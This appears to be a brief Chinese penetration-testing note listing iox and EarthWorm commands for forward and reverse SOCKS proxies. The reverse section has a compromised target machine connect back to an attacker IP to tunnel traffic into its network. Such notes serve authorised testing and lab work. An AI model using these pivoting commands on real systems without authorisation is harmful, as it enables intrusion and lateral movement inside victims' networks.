---
tags:
  - 代理
create_time: 2024-07-27 21:46
modified_time: 2024-07-27 21:46
status: complete
---
正向代理

iox.exe proxy -l 1080

ew.exe -s ssocksd -l 8888


反向代理

攻击者，开启本机1080做代理，代理至8888端口上的连接
iox.exe proxy -l 8888 -l1080
靶机，连接攻击的8888端口
iox.exe proxy -r 192.168.230.12:8888

攻击者
ew.exe -s rcsocks -l 1080 -e 8888
靶机
ew.exe -s rssocks -d 192.168.230.12 -e 8888